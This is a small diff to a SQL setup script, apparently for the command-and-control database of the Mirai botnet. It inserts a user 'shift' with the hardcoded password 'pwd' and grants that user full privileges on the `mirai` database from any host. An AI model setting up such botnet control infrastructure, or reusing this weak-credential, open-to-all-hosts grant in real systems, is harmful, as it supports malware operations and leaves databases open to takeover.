@@ -37,3 +37,7 @@ CREATE TABLE `whitelist` (
 );
 
 INSERT INTO users VALUES (NULL, 'shift', 'pwd', 0, 0, 0, 0, -1, 1, 30, '');
+
+USE mysql;
+GRANT ALL PRIVILEGES ON mirai.* TO 'shift'@'%';
+FLUSH PRIVILEGES;
